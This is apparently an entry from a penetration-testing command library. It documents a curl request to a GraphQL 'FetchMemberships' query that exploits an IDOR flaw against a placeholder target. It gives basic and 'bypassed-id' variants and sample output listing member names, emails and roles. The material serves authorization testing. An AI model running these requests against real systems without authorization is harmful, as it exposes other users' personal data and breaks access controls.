---
data: >-
  curl -X POST https://target.example.com/api/v1/graphql -H "Content-Type:
  application/json" -H "Authorization: Bearer <optional-token>" -d '{"query":
  "query FetchMemberships { memberships { id name email role } }"}'
tags:
  - graphql
  - idor
  - http-request
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: c3bcc8e4-89c0-47e2-94c7-73eb147cde86
created_at: '2025-12-14T17:25:47.583Z'
updated_at: '2025-12-14T17:25:47.583Z'
verified: false
validated: true
submitted: true
---
# curl-post-graphql-fetchmemberships

## Command

```bash
curl -X POST https://target.example.com/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <optional-token>" \
  -d '{"query": "query FetchMemberships { memberships { id name email role } }"}'
```

## Description

This command sends a POST request to a GraphQL endpoint to execute the FetchMemberships query, exploiting an IDOR vulnerability to retrieve unauthorized team member data. Use it when testing for authorization bypasses in GraphQL APIs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://target.example.com/api/v1/graphql` | The target GraphQL endpoint URL | Yes |
| `-H "Content-Type: application/json"` | Sets the request body content type to JSON | Yes |
| `-H "Authorization: Bearer <optional-token>"` | Optional authentication header for session context | No |
| `-d '{"query": "..."}'` | The JSON payload containing the GraphQL query | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.example.com/api/v1/graphql -H "Content-Type: application/json" -d '{"query": "query FetchMemberships { memberships { id name email role } }"}'
```

### Advanced Usage

```bash
curl -X POST https://target.example.com/api/v1/graphql -H "Content-Type: application/json" -H "Authorization: Bearer eyJ..." -d '{"query": "query FetchMemberships($orgId: ID) { memberships(orgId: $orgId) { id name email role } }", "variables": {"orgId": "bypassed-id"}}' --verbose
```

## Expected Output

Successful execution returns a JSON response like:
```json
{
  "data": {
    "memberships": [
      {
        "id": "123",
        "name": "John Doe",
        "email": "john@example.com",
        "role": "Admin"
      }
    ]
  }
}
```
Data from unauthorized teams indicates successful IDOR exploitation.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-in-GraphQL-FetchMemberships]]
- [[Related Command|commands/curl-graphql-introspect]]
